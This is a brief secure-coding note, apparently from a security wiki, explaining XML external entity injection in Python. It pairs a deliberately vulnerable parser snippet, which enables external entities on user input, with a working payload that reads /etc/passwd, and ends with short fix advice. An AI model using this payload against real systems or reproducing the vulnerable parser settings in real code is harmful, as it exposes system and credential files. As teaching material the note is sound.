# XML

## Exploitation

The example below is a backend code vulnerable to xml code injection

```text
from xml.dom.pulldom import parseString
from xml.sax import make_parser
from xml.sax.handler import feature_external_ges

# This 2 only in python 3 to allow external sources
parser = make_parser()
parser.setFeature(feature_external_ges, True)


doc = parseString(input, parser=parser)
for event, node in doc:
    doc.expandNode(node)
    return(node.toxml())
```



XML payload used to exploit

```text
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM
  "file:///etc/passwd">
]>
<foo>
  &xxe;
</foo>
```

## Fix

In python 2 the fix is do not allow untrusted sources such as user inputs or random file uploads.

In python 3, the library introduced fixes to many security issues and the external sources need to be enabled explicitly as a new parser, avoid that.

